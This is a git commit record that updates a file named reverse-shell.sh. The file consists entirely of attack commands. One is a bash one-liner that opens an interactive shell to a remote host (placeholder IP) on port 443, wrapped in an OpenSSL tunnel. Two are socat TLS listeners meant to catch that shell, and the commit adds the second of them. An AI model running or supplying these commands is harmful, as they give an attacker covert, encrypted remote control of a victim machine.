5e79d3c72838e8e1da2a88bce5aaaa18564d46b0
emerick-19 <mitchikpeemerick2@gmail.com>
2026-03-19 12:58:57 -0400

    Update reverse-shell.sh

--- reverse-shell.sh
+++ reverse-shell.sh
@@ -1,2 +1,3 @@
 bash -c 'bash -i >& /dev/tcp/IP/443 0>&1' | openssl s_client -quiet -connect IP:443
 socat OPENSSL-LISTEN:443,cert=attack.pem,verify=0,fork -
+socat -v OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork,reuseaddr,verify=0 STDOUT
